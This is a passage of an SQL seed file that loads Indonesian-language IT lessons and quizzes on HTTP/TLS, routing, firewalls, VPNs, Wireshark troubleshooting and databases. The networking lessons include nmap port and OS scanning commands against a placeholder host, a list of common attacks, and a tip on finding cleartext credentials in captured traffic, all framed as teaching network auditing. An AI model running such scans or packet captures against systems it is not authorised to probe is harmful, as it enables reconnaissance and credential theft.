5xx Server Error   (500 Internal, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout)
```

## HTTP Headers Penting

- `Authorization: Bearer <token>` — autentikasi JWT/OAuth
- `Content-Type: application/json` — tipe body request
- `Cookie` / `Set-Cookie` — sesi & autentikasi
- `Cache-Control` — caching policy (max-age, no-cache)
- `CSP` — Content Security Policy (mitigasi XSS)
- `HSTS` — paksa HTTPS di browser
- `X-Frame-Options` — klikjacking protection
- `CORS` — cross-origin resource sharing

## HTTPS & TLS Handshake

```text
1. ClientHello  → client kirim supported cipher & random
2. ServerHello  → server pilih cipher & kirim certificate
3. Key Exchange → client verifikasi cert & kirim pre-master secret
4. Finished     → kedua pihak punya session key simetris
5. Application data dienkripsi dengan session key
```

TLS 1.3 (2018) menyederhanakan handshake jadi 1-RTT, lebih cepat dan aman. Browser modern sudah drop TLS 1.0/1.1 karena rentan serangan.

## HTTP/2 vs HTTP/1.1

- **Multiplexing** — multiple request dalam 1 koneksi TCP
- **Header compression** (HPACK) — hemat bandwidth
- **Server push** — server bisa kirim resource proaktif
- **Binary protocol** — lebih efisien dari text

```bash
# Cek apakah HTTP/2 aktif
curl -I --http2 https://example.com

# Cek versi TLS yang dinegosiasi
openssl s_client -connect example.com:443 -tls1_3
```

## Cookies & Session

```text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
```

Atribut penting cookie:
- **HttpOnly** — tidak bisa diakses JavaScript (anti XSS)
- **Secure** — hanya dikirim via HTTPS
- **SameSite** — proteksi CSRF (Lax/Strict/None)
- **Max-Age / Expires** — lifetime cookie

## Tips & Best Practices

1. Selalu aktifkan **HSTS** dan redirect HTTP → HTTPS untuk mencegah serangan downgrade.
2. Set cookie atribut `HttpOnly`, `Secure`, `SameSite=Lax` untuk keamanan.
3. Gunakan CSP header untuk mitigasi XSS.
4. Aktifkan HTTP/2 atau HTTP/3 di web server untuk performa.
5. Manfaatkan `Cache-Control` dan ETag untuk caching efektif.

## Kesimpulan

HTTP/HTTPS adalah protokol inti web. Memahami methods, status code, headers, TLS handshake, dan evolusi HTTP/1.1 → 2 → 3 membuat Anda mampu membangun API yang baik, debugging request di DevTools, dan mengoptimalkan performa website. Selalu gunakan HTTPS di production dengan TLS 1.3 dan aktifkan header keamanan modern.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🔒', false, '[{"question":"HTTP status code 404 berarti?","options":["Server error","Resource tidak ditemukan","Tidak otorisasi","Redirect permanen"],"answer":1,"explanation":"404 Not Found berarti resource yang diminta tidak ada di server. Termasuk kategori 4xx Client Error."},{"question":"HTTP method yang aman (safe) dan idempotent untuk mengambil data adalah?","options":["POST","PUT","GET","DELETE"],"answer":2,"explanation":"GET bersifat safe (tidak mengubah state server) dan idempotent (request berulang memberi hasil sama)."},{"question":"Apa fungsi utama HTTPS dibanding HTTP biasa?","options":["Membuat halaman lebih cepat dimuat","Mengenkripsi komunikasi dengan TLS/SSL","Mengurangi ukuran file","Memperbanyak header request"],"answer":1,"explanation":"HTTPS membungkus HTTP dalam enkripsi TLS/SSL, sehingga data antara client dan server tidak dapat disadap atau dimodifikasi pihak ketiga."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('routing-switching', 4, 7, 'Routing & Switching', 'routing-switching', 'Router, switch, routing table, dan protocol (OSPF, BGP).', '# Routing & Switching


![Routing & Switching](https://sfile.chatglm.cn/images-ppt/4db8e4f5fbc8.png)

**Switching** menghubungkan perangkat dalam satu jaringan (LAN) berdasarkan MAC address di layer 2, sedangkan **routing** menghubungkan antar jaringan berbeda berdasarkan IP address di layer 3. Keduanya adalah fondasi infrastruktur jaringan — tanpa routing, internet global tidak akan ada. Memahami cara router memilih jalur dan cara switch meneruskan frame adalah ilmu wajib bagi network engineer, cloud architect, dan sysadmin yang mengelola infrastruktur multi-tier.

![Routing dan switching antar jaringan](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Switch vs Router

```text
Switch             | Router
-------------------|---------------------
Layer 2 (Data Link)| Layer 3 (Network)
Pakai MAC address  | Pakai IP address
Forward frame      | Forward packet
Buat satu broadcast| Pisahkan broadcast domain
Learning MAC table | Routing table & next-hop
Cepat, hardware    | Lebih cerdas, software
```

Switch modern (L3 switch) juga bisa routing antar VLAN, menggabungkan kecepatan hardware dengan inteligensi layer 3.

## Routing Table

Setiap router menyimpan tabel yang menentukan ke mana paket diteruskan:

```bash
# Lihat routing table Linux
ip route show
route -n

# Tambah route statik manual
sudo ip route add 10.50.0.0/24 via 192.168.1.1

# Trace jalur paket
traceroute 8.8.8.8
mtr 8.8.8.8
```

Isi routing table:

```text
Destination   Gateway         Interface  Metric
0.0.0.0/0     192.168.1.1     eth0       100   (default route)
10.0.0.0/8    10.0.0.254      eth1       10
192.168.1.0/24 0.0.0.0         eth0       0     (directly connected)
```

Router memilih entry dengan **longest prefix match** — paling spesifik menang. Bila ada 0.0.0.0/0 (default route), paket dengan tujuan tidak dikenal akan diteruskan ke sana.

## Routing Protocol

```text
Static routing   → Manual, cocok untuk jaringan kecil
RIP              → Distance vector, metric = hop count (max 15)
OSPF             → Link-state, konvergen cepat, area-based
IS-IS            → Link-state, dipakai ISP besar
BGP              → Antar autonomous system, dipakai internet global
EIGRP            → Cisco proprietary, hybrid
```

Routing protocol dibagi IGP (Interior Gateway Protocol — OSPF, RIP, EIGRP) untuk dalam organisasi, dan EGP (Exterior — BGP) untuk antar organisasi/AS.

## OSPF vs BGP

- **OSPF** digunakan **di dalam** satu organisasi (IGP), memilih jalur berdasarkan bandwidth/cost. Konvergen cepat, mendukung area hierarchy untuk skalabilitas.
- **BGP** menghubungkan **antar** ISP/AS (EGP), jalur ditentukan berdasarkan kebijakan (policy-based routing) bukan hanya metric. BGP adalah protokol yang menjalankan internet global.

```text
Contoh Autonomous System:
AS15169 = Google
AS32934 = Facebook/Meta
AS13335 = Cloudflare
AS1299  = Telia (transit)
```

## VLAN & Trunking

VLAN (Virtual LAN) membagi satu switch fisik menjadi multiple broadcast domain logis:

```text
VLAN 10 → Engineering (192.168.10.0/24)
VLAN 20 → Sales       (192.168.20.0/24)
VLAN 30 → Guest       (192.168.30.0/24)

Inter-VLAN routing dilakukan oleh L3 switch atau router-on-a-stick
```

Trunk link antar switch membawa multiple VLAN menggunakan 802.1Q tagging. VLAN meningkatkan keamanan dan mengurangi broadcast traffic.

## Konfigurasi Router Cisco (Contoh)

```text
enable
configure terminal
interface GigabitEthernet0/0
  ip address 192.168.1.1 255.255.255.0
  no shutdown
!
router ospf 1
  network 192.168.1.0 0.0.0.255 area 0
  network 10.0.0.0 0.255.255.255 area 0
!
end
write memory
```

## Tips & Best Practices

1. Gunakan `traceroute` atau `mtr` untuk melihat router-router mana yang dilewati paket dari komputer Anda menuju server tujuan.
2. Selalu dokumentasikan routing table dan VLAN mapping di NetBox atau spreadsheet.
3. Hindari routing loop dengan protokol yang mendukung split horizon / poison reverse.
4. Untuk high availability, konfigurasi redundancy seperti VRRP/HSRP atau BGP multihoming.
5. Monitor routing updates dengan SNMP/syslog untuk deteksi masalah cepat.

## Kesimpulan

Routing dan switching adalah dua sisi mata uang jaringan. Switch bekerja di layer 2 berbasis MAC untuk hubungkan perangkat dalam LAN, sedangkan router bekerja di layer 3 berbasis IP untuk hubungkan antar jaringan. Dengan memahami routing table, protokol (OSPF, BGP), dan VLAN, Anda dapat merancang jaringan yang efisien dan scalable — dari LAN kantor hingga backbone ISP.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🛣️', false, '[{"question":"Perbedaan utama switch dan router adalah?","options":["Switch lebih cepat dari router","Switch bekerja di layer 2 (MAC), router di layer 3 (IP)","Router hanya untuk Wi-Fi","Switch bisa routing, router tidak"],"answer":1,"explanation":"Switch bekerja di layer 2 Data Link menggunakan MAC address, sedangkan router bekerja di layer 3 Network menggunakan IP address untuk routing antar jaringan."},{"question":"Routing protocol yang digunakan antar Autonomous System di internet adalah?","options":["OSPF","RIP","BGP","EIGRP"],"answer":2,"explanation":"BGP (Border Gateway Protocol) adalah EGP yang menghubungkan antar Autonomous System. OSPF/RIP/EIGRP adalah IGP untuk dalam AS."},{"question":"Entry 0.0.0.0/0 pada routing table disebut?","options":["Loopback route","Default route","Multicast route","Static route khusus"],"answer":1,"explanation":"0.0.0.0/0 adalah default route — paket dengan tujuan yang tidak cocok entry lain akan diteruskan ke gateway default ini."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('firewall-network-security', 4, 8, 'Firewall & Network Security', 'firewall-network-security', 'Firewall, IDS/IPS, dan network security basics.', '# Firewall & Network Security


![Firewall & Network Security](https://sfile.chatglm.cn/images-ppt/e8dd87b49cc5.png)

**Firewall** adalah sistem (hardware atau software) yang memfilter traffic jaringan berdasarkan aturan keamanan. **IDS** (Intrusion Detection System) mendeteksi serangan secara pasif, **IPS** (Intrusion Prevention System) mendeteksi sekaligus memblokir secara aktif. Keduanya melindungi jaringan dari ancaman eksternal dan internal. Di era serangan siber yang makin canggih, firewall saja tidak cukup — diperlukan pendekatan **defense in depth** (pertahanan berlapis) yang menggabungkan berbagai teknologi keamanan.

![Arsitektur firewall dan keamanan jaringan](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Jenis Firewall

```text
Packet Filtering  → Filter per paket (IP, port, protocol) - stateless
Stateful          → Lacak state koneksi TCP - paling umum
Proxy             → Memproxy traffic di layer aplikasi
NGFW              → Next-Gen: deep packet inspection + IPS
WAF               → Web App Firewall (HTTP/HTTPS layer 7)
```

NGFW (Next-Gen Firewall) seperti Palo Alto, Fortinet, dan Cisco Firepower menggabungkan traditional firewall dengan IPS, application awareness, dan threat intelligence. WAF (Cloudflare, AWS WAF, ModSecurity) fokus melindungi aplikasi web dari serangan layer 7.

## Contoh Rules iptables (Linux)

```bash
# Lihat rules aktif
sudo iptables -L -n -v

# Izinkan SSH, HTTP, HTTPS; blok sisanya
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -j DROP

# Blok IP tertentu
sudo iptables -A INPUT -s 203.0.113.50 -j DROP

# Simpan rules permanen
sudo iptables-save > /etc/iptables/rules.v4
```

Alternatif modern: `nftables` (pengganti iptables di kernel 5.x) dan `ufw` (Uncomplicated Firewall, wrapper user-friendly di Ubuntu).

## IDS vs IPS

```text
IDS (Intrusion Detection System)
  → Pasif, hanya alert & log (mis. Snort mode pasif)
  → Biasanya span/mirror port switch
  → Tidak mempengaruhi traffic

IPS (Intrusion Prevention System)
  → Aktif, inline memblokir serangan
  → Bisa drop paket, reset koneksi, ban IP
  → Sedikit menambah latency
```

Populer: **Snort**, **Suricata**, **Zeek** (dulu Bro), **Security Onion** (distro all-in-one). Sumber rule: Emerging Threats, Talos, dan feed komersial.

## Jenis Serangan Jaringan Umum

```text
Port Scan         → Reconnaissance (nmap)
SYN Flood         → DoS dengan TCP SYN palsu
DDoS             → Banjir traffic dari botnet
MITM             → Man-in-the-Middle, sniff password
SQL Injection    → Eksploitasi input form
XSS              → Inject script ke web orang lain
Brute Force      → Tebak password SSH/RDP
ARP Spoofing     → Palsukan MAC di LAN
DNS Poisoning    → Corrupt cache DNS
```

## Network Security Best Practices

1. **Principle of least privilege** — buka port secukupnya, hanya yang dibutuhkan
2. **Default deny** — tolak semua, izinkan yang perlu (lebih aman dari default allow)
3. **Segmentasi jaringan** — pisahkan DMZ, internal, guest, IoT dengan VLAN
4. **Logging & monitoring** — kirim log ke SIEM (Splunk, ELK, Wazuh)
5. **Patch management** — update rutin router, firewall, dan OS
6. **Strong authentication** — 2FA untuk akses administrasi, hindari password default
7. **Encryption** — VPN untuk remote access, TLS untuk semua traffic web
8. **Backup** — 3-2-1 rule: 3 copy, 2 media, 1 offsite

## Zero Trust Architecture

```text
Tradisional: "Castle and moat" — sekali masuk, bebas akses
Zero Trust  : "Never trust, always verify" — verifikasi setiap request
            → Identity-based, micro-segmentation, least privilege
```

Zero Trust mengasumsikan jaringan sudah terkompromi. Setiap akses diverifikasi berdasarkan identitas, device, konteks (lokasi, waktu), dan policy — bukan sekadar "berada di dalam network".

## Tips & Best Practices

1. Kombinasikan firewall dengan IPS dan SIEM untuk pertahanan berlapis (defense in depth). Firewall saja tidak cukup melawan serangan layer 7.
2. Lakukan penetration test rutin (internal & external) untuk validasi efektivitas aturan.
3. Disable service yang tidak dipakai — setiap port terbuka adalah attack surface.
4. Monitor log secara real-time dengan alerting otomatis untuk anomali.
5. Latih staff dengan phishing simulation — human adalah link terlemah.

## Kesimpulan

Keamanan jaringan bukan produk tunggal, melainkan proses berkelanjutan yang menggabungkan teknologi (firewall, IDS/IPS, WAF), proses (patch, audit, monitoring), dan orang (training, awareness). Dengan menerapkan defense in depth, prinsip least privilege, dan beralih ke Zero Trust, Anda membangun postur keamanan yang lebih tangguh terhadap ancaman modern.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🧱', false, '[{"question":"Perbedaan IDS dan IPS adalah?","options":["IDS hanya mendeteksi, IPS mendeteksi sekaligus memblokir","IDS lebih cepat dari IPS","IPS hanya untuk Wi-Fi","IDS bekerja di layer 7, IPS di layer 3"],"answer":0,"explanation":"IDS (Intrusion Detection System) bersifat pasif hanya memberi alert. IPS (Intrusion Prevention System) inline aktif memblokir serangan secara real-time."},{"question":"Prinsip ''default deny'' pada firewall berarti?","options":["Semua traffic ditolak kecuali yang diizinkan eksplisit","Semua traffic diizinkan kecuali yang ditolak","Tidak ada rule yang dibuat","Firewall dimatikan default"],"answer":0,"explanation":"Default deny berarti semua traffic default ditolak, hanya traffic yang secara eksplisit diizinkan rule yang lolos. Ini prinsip paling aman."},{"question":"WAF (Web Application Firewall) bekerja di layer OSI mana?","options":["Layer 3 (Network)","Layer 4 (Transport)","Layer 7 (Application)","Layer 2 (Data Link)"],"answer":2,"explanation":"WAF bekerja di layer 7 Application, memfilter request HTTP/HTTPS untuk melindungi aplikasi web dari serangan seperti SQLi dan XSS."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('vpn-tunneling', 4, 9, 'VPN & Tunneling', 'vpn-tunneling', 'VPN, tunneling protocol, dan akses remote aman.', '# VPN & Tunneling


![VPN & Tunneling](https://sfile.chatglm.cn/images-ppt/41f6d4b2456d.svg)

**VPN (Virtual Private Network)** membuat terowongan terenkripsi antara perangkat Anda dan server VPN sehingga traffic tidak dapat disadap pihak ketiga. **Tunneling** adalah teknik mengkapsulasi paket satu protokol di dalam protokol lain — biasanya dengan enkripsi. VPN dulunya untuk akses kantor dari rumah, kini juga dipakai untuk privasi, bypass geoblock, dan keamanan di Wi-Fi publik. Dengan naiknya remote work sejak pandemi, VPN menjadi tools wajib bagi profesional IT.

![Cara kerja VPN dan tunneling](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Cara Kerja VPN

```text
[Client] --encrypted tunnel-- [VPN Server] --plain-- [Internet]

Tanpa VPN:  ISP lihat traffic, bisa disadap MITM
Dengan VPN: ISP hanya lihat enkripsi, IP asli tersembunyi
            Website melihat IP VPN server, bukan IP Anda
```

VPN mengenkripsi payload paket dan membungkusnya dalam header baru. Hasilnya: tunnel yang aman melalui jaringan tidak terpercaya (internet). Karena ada overhead enkripsi, VPN biasanya sedikit lebih lambat dari koneksi langsung.

## Protokol VPN

```text
OpenVPN    → Open-source, OpenSSL, sangat aman & fleksibel
WireGuard  → Modern, ringan, cepat, sedikit kode (audit mudah)
IPsec      → Standar industri, sering site-to-site
L2TP/IPsec → Tunnel layer 2 + enkripsi IPsec
PPTP       → Usang & tidak aman, jangan dipakai
SSTP       → Microsoft, over HTTPS (port 443)
SoftEther  → Multi-protokol, sangat fleksibel
```

**WireGuard** (rilis stabil 2020) menjadi tren baru karena kode kecil (~4.000 baris vs OpenVPN ~100.000), performa tinggi, dan kriptografi modern. Sudah terintegrasi kernel Linux sejak 5.6.

## Setup WireGuard Cepat

```bash
# Install di Linux
sudo apt install wireguard

# Generate keypair
wg genkey | tee private.key | wg pubkey > public.key

# Konfigurasi client /etc/wireguard/wg0.conf
[Interface]
PrivateKey = <client_private_key>
Address    = 10.8.0.2/24

[Peer]
PublicKey  = <server_public_key>
Endpoint   = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0   # full tunnel

# Aktifkan
sudo wg-quick up wg0
sudo wg show
```

WireGuard menggunakan UDP saja (default port 51820). Tidak ada handshake TCP yang berat seperti OpenVPN, sehingga lebih cepat terutama pada jaringan mobile dengan latency tinggi.

## Tipe VPN Berdasarkan Skala

```text
Remote access  → 1 client ke jaringan kantor (work from home)
Site-to-site   → Kantor cabang ke pusat (rutin menghubungkan LAN)
Host-to-host   → 2 server langsung (mis. DB replication)
Mesh VPN       → Banyak node saling terhubung (Tailscale, ZeroTier)
```

**Tailscale** dan **ZeroTier** adalah VPN mesh modern di atas WireGuard — setiap node terhubung langsung ke node lain tanpa server pusat, sangat mudah setup untuk tim kecil.

## Use Case VPN

- **Remote work** — akses jaringan kantor dari rumah dengan aman
- **Privasi** — sembunyikan IP dari ISP dan website pelacak
- **Bypass geoblock** — akses konten regional terbatas (Netflix US, BBC iPlayer)
- **Keamanan Wi-Fi publik** — enkripsi traffic di kafe/bandara/hostel
- **Site-to-site** — menghubungkan kantor cabang ke pusat
- **Bypass sensor** — akses internet bebas di negara dengan pembatasan

## Tunneling Populer

```text
SSH tunnel      → ssh -L 8080:localhost:80 user@server (port forwarding)
IP-in-IP        → Sederhana, no encryption
GRE             → Cisco, no encryption (sering dipakai dengan IPsec)
STunnel         → SSL wrap arbitrary TCP
6in4            → Tunnel IPv6 melalui IPv4
```

SSH tunnel adalah trik favorit sysadmin — bisa forward port lokal ke remote server lewat koneksi SSH yang sudah terenkripsi. Sangat berguna untuk akses service internal tanpa expose ke publik.

## Keamanan & Privacy: Mitos vs Fakta

- **Mitos:** VPN membuat anon 100%. **Fakta:** VPN provider bisa log traffic, pilih yang no-log (audit independen).
- **Mitos:** VPN selalu mempercepat internet. **Fakta:** VPN menambah overhead, biasanya lebih lambat.
- **Mitos:** VPN gratis aman. **Fakta:** Banyak VPN gratis menjual data pengguna.

## Tips & Best Practices

1. WireGuard lebih cepat dan lebih mudah dikonfigurasi dibanding OpenVPN untuk pemula. Pilih WireGuard bila memungkinkan.
2. Untuk tim kecil, gunakan Tailscale/ZeroTier — setup dalam 5 menit, free untuk personal use.
3. Jangan pakai VPN gratis yang tidak terverifikasi — banyak yang menjual data.
4. Aktifkan kill switch agar traffic tidak bocor saat VPN putus.
5. Pisahkan tunnel (split tunneling) — hanya traffic internal lewat VPN, internet langsung.

## Kesimpulan

VPN dan tunneling adalah teknologi esensial untuk akses remote aman, privasi, dan konektivitas antar jaringan. Dengan menguasai protokol (WireGuard, OpenVPN, IPsec), tipe (remote access, site-to-site, mesh), dan tools modern (Tailscale), Anda dapat membangun infrastruktur akses yang aman untuk individu maupun organisasi. Setup VPN server WireGuard sendiri di VPS murah adalah latihan terbaik untuk praktik nyata.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🔒', false, '[{"question":"Protokol VPN yang USANG dan tidak aman adalah?","options":["WireGuard","OpenVPN","PPTP","IPsec"],"answer":2,"explanation":"PPTP memiliki enkripsi lemah (MPPE) dan sudah banyak vulnerabilitas. Tidak boleh dipakai untuk VPN modern."},{"question":"Tujuan utama menggunakan VPN adalah?","options":["Mempercepat koneksi internet","Membuat terowongan terenkripsi untuk melindungi traffic","Mengganti antivirus","Meningkatkan kapasitas storage"],"answer":1,"explanation":"VPN membuat tunnel terenkripsi sehingga traffic terlindungi dari penyadapan, dan IP asli perangkat tersembunyi."},{"question":"Protokol VPN modern yang ringan, cepat, dan kode-nya sedikit sehingga mudah diaudit?","options":["PPTP","L2TP","WireGuard","SSTP"],"answer":2,"explanation":"WireGuard memiliki sekitar 4.000 baris kode (jauh lebih sedikit dari OpenVPN ~100rb), sehingga audit keamanan jauh lebih mudah dan performanya cepat."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('network-troubleshooting-wireshark', 4, 10, 'Network Troubleshooting Wireshark', 'network-troubleshooting-wireshark', 'Troubleshooting jaringan dengan Wireshark dan tools (ping, traceroute, nmap).', '# Network Troubleshooting Wireshark


![Network Troubleshooting Wireshark](https://sfile.chatglm.cn/images-ppt/4278efeee316.jpg)

**Wireshark** adalah network protocol analyzer paling populer di dunia. Ia menangkap paket real-time dan menampilkannya dalam bentuk yang bisa dibaca manusia — mulai dari header Ethernet hingga payload HTTP. Kombinasikan dengan tool klasik seperti `ping`, `traceroute`, `nmap`, dan `tcpdump` untuk troubleshooting jaringan yang efektif. Skill Wireshark sangat dihargai di industri jaringan, keamanan siber, dan DevOps karena memberi visibilitas ke dalam traffic yang tidak bisa dilihat tool lain.

![Wireshark untuk analisis paket jaringan](https://sfile.chatglm.cn/images-ppt/69006b36966a.jpg)

## Tools Dasar

```bash
# Cek konektivitas dasar
ping -c 4 google.com

# Lihat jalur paket
traceroute google.com
mtr -n google.com            # interaktif, gabungan ping+traceroute

# Cek port terbuka
nmap -sS -p 80,443 example.com
nmap -A scanme.nmap.org      # aggressive, OS+service detection

# Cek DNS
dig example.com
```

**ping** mengirim ICMP Echo Request dan menunggu Reply — cek apakah host reachable dan ukur latency. **traceroute** memetakan router antara Anda dan tujuan dengan TTL bertingkat. **mtr** menggabungkan keduanya real-time. **nmap** adalah swiss army knife untuk scanning jaringan.

## Capture dengan Wireshark

```bash
# Capture dari CLI (tanpa GUI)
sudo tshark -i eth0 -f "tcp port 80" -w capture.pcap

# Buka file capture
wireshark capture.pcap

# Filter saat capture (lebih efisien)
sudo tcpdump -i eth0 -w capture.pcap ''tcp port 443''
```

Langkah capture di GUI Wireshark:

1. Pilih interface (eth0/wlan0)
2. Klik **Start capturing**
3. Lakukan aktivitas (buka website, ping)
4. **Stop** dan analisa paket
5. Gunakan display filter untuk fokus pada traffic tertentu

## Display Filter Wireshark

```text
ip.addr == 192.168.1.10         # IP tertentu
tcp.port == 443                  # HTTPS saja
http.request.method == "POST"    # POST request
dns.qry.name contains "google"   # DNS lookup tertentu
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN packets (scan?)
http.response.code == 500        # HTTP 500 errors
tcp.analysis.retransmission      # paket rusak/retry
```

Filter Wireshark sangat powerful — bisa filter hampir semua field di setiap protokol. Pelajari filter yang sering dipakai karena bisa menghemat banyak waktu analisis.

## Skenario Troubleshooting

- **Tidak bisa internet** → cek `ping 8.8.8.8` (IP) lalu `ping google.com` (DNS). Kalau IP ok tapi DNS gagal → masalah DNS.
- **Website lambat** → Wireshark filter `tcp.analysis.retransmission` untuk lihat paket rusak.
- **Port scan terdeteksi** → filter `tcp.flags.syn==1 && tcp.flags.ack==0` berulang dari IP yang sama.
- **Credensial bocor** → cari `http.request.method == "POST"` di website non-HTTPS.
- **Latency tinggi** → `tcp.analysis.ack_rtt` untuk lihat round-trip time per paket.
- **Koneksi terputus-putus** → lihat TCP reset (`tcp.flags.reset==1`).

## Analisis TCP di Wireshark

```text
TCP Stream: Follow TCP Stream untuk lihat percakapan lengkap
TCP Graph: Round-trip time, throughput, window size
Sequence Analysis: Lihat retransmission, dup ACK, out-of-order
```

Klik kanan paket TCP → Follow → TCP Stream untuk melihat seluruh percakapan sebagai teks. Sangat berguna untuk debugging HTTP, FTP, atau protokol text-based lainnya.

## Nmap untuk Security Audit

```bash
# Scan semua port
nmap -p- target.com

# Detect OS & service version
nmap -A target.com

# Scan cepat 1000 port umum
nmap -F target.com

# UDP scan (lambat, perlu root)
sudo nmap -sU target.com

# Output ke file
nmap -oN scan.txt -oX scan.xml target.com
```

Nmap wajib ada di toolkit setiap sysadmin/security engineer. Pelajari flag utama (`-sS`, `-sV`, `-A`, `-p`, `-O`) untuk efektif audit jaringan sendiri.

## Topologi & Tools Monitoring

Selain Wireshark, ada tool monitoring jaringan populer:

- **Nagios / Icinga** — alerting berbasis threshold
- **Zabbix** — monitoring komprehensif dengan agent
- **Prometheus + Grafana** — metric time-series + dashboard
- **Cacti / Observium** — SNMP polling untuk SNMP device
- **Elastic Stack (ELK)** — log analysis dan SIEM

## Tips & Best Practices

1. Gunakan `tcpdump` di server tanpa GUI, lalu buka file `.pcap` di Wireshark lokal untuk analisis mendalam.
2. Capture hanya yang perlu dengan capture filter (`-f`) untuk hemat disk dan memory.
3. Untuk traffic HTTPS, gunakan `SSLKEYLOGFILE` environment variable agar Wireshark bisa dekripsi TLS.
4. Jangan capture terlalu lama — file bisa menjadi GB dalam menit di jaringan sibuk.
5. Pelajari display filter cheat sheet — ini skill yang membedakan pemula dan ahli.

## Kesimpulan

Wireshark bersama `ping`, `traceroute`, `nmap`, dan `tcpdump` adalah toolkit fundamental untuk troubleshooting jaringan. Dengan menguasai capture paket, display filter, analisis TCP stream, dan skenario debugging umum, Anda dapat menyelesaikan masalah jaringan yang kompleks dengan cepat. Praktik terbaik: buka Wireshark saat login ke website non-HTTPS lalu cari paket POST — Anda akan langsung paham mengapa HTTPS penting.



## Studi Kasus: Troubleshooting

Ping server, traceroute, check DNS, check port, Wireshark.

## Tips

> Setup lab sendiri dengan virtual machines.', '🦈', false, '[{"question":"Tool yang paling tepat untuk melihat jalur (hop) yang dilewati paket ke server adalah?","options":["ping","traceroute","nmap","netstat"],"answer":1,"explanation":"traceroute mengirim paket dengan TTL bertingkat untuk memetakan setiap router (hop) antara sumber dan tujuan."},{"question":"Filter Wireshark untuk hanya menampilkan traffic HTTP POST adalah?","options":["http.post","tcp.port == 80","http.request.method == \"POST\"","http.method == post"],"answer":2,"explanation":"Filter Wireshark yang benar adalah `http.request.method == \"POST\"`. Filter ini menampilkan hanya request HTTP dengan method POST."},{"question":"Jika ping ke 8.8.8.8 berhasil tapi ping google.com gagal, masalah kemungkinan di?","options":["Kabel jaringan putus","DNS tidak berfungsi","Firewall memblokir semua traffic","Router mati"],"answer":1,"explanation":"Kalau IP bisa di-ping tapi nama domain tidak, berarti koneksi ke internet OK tapi DNS resolver gagal menerjemahkan nama ke IP."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-database', 5, 1, 'Pengenalan Database', 'pengenalan-database', 'Apa itu database, RDBMS vs NoSQL, dan perannya dalam aplikasi.', '# Pengenalan Database


![Pengenalan Database](https://sfile.chatglm.cn/images-ppt/65e4540aa5b5.jpg)

**Database** adalah kumpulan data terorganisir yang disimpan secara elektronik dan dapat diakses, dikelola, dan diperbarui dengan efisien. **DBMS** (Database Management System) adalah software yang mengelola database — mis. MySQL, PostgreSQL, MongoDB, Redis. Database menjadi jantung hampir semua aplikasi modern: dari e-commerce, banking, social media, hingga IoT. Tanpa database yang andal, aplikasi tidak bisa menyimpan data user, transaksi, atau konten secara persisten.

![Konsep dasar database dan DBMS](https://sfile.chatglm.cn/images-ppt/732bf850a843.jpeg)

## Mengapa Perlu Database?

```text
File biasa (.txt/.csv):
  + Sederhana, zero setup
  - Tidak konsisten saat banyak user concurrent
  - Sulit query kompleks
  - Tidak ada transaksi & integritas data
  - Tidak ada backup/replication built-in

Database:
  + Concurrent access aman (locking, MVCC)
  + Query cepat dengan SQL/index
  + ACID transaction (konsistensi kuat)
  + Backup, indexing, security, replication
  - Setup lebih kompleks, butuh resource
```

Untuk aplikasi mainan, file mungkin cukup. Tapi begitu ada multiple user, butuh transaksi, atau query kompleks, database menjadi keharusan.

## RDBMS vs NoSQL

```text
RDBMS (Relational)         | NoSQL
---------------------------|---------------------------
Tabel, row, column         | Document / Key-value / Graph
SQL query language         | API khusus (MongoDB query)
Skema kaku                 | Skema fleksibel
ACID strong                | CAP trade-off (sering eventual)
MySQL, PostgreSQL, SQLite  | MongoDB, Redis, Cassandra
Cocok: data terstruktur   | Cocok: data dinamis, skala besar
```

Pilih RDBMS bila data terstruktur dan butuh ACID (keuangan, inventory, ERP). Pilih NoSQL bila skema sering berubah atau butuh skala horizontal masif (real-time analytics, content management, IoT).

## Jenis NoSQL

- **Document store** — MongoDB, CouchDB (simpan JSON document)
- **Key-value** — Redis, Memcached (super cepat, sederhana)
- **Column-family** — Cassandra, HBase (skala besar, write-heavy)
- **Graph** — Neo4j, ArangoDB (hubungan kompleks, social network)
- **Time-series** — InfluxDB, TimescaleDB (metric, monitoring)
- **Search engine** — Elasticsearch, Meilisearch (full-text search)

## Komponen Database

```bash
# Cek koneksi ke PostgreSQL
psql -U postgres -h localhost

# Lihat database yang ada
\l

# Buat database baru
CREATE DATABASE coderoom;

# Pilih database
\c coderoom
```

Komponen penting:

1. **Table** — struktur penyimpanan data (row × column)
2. **Schema** — blueprint tabel, tipe data, relasi
3. **Index** — struktur B-Tree untuk pencarian cepat
4. **View** — virtual table hasil query
5. **Stored procedure** — fungsi tersimpan di server DB
6. **Trigger** — aksi otomatis saat event tertentu (INSERT/UPDATE/DELETE)
7. **Transaction** — unit kerja ACID (commit/rollback)

## Konsep ACID

```text
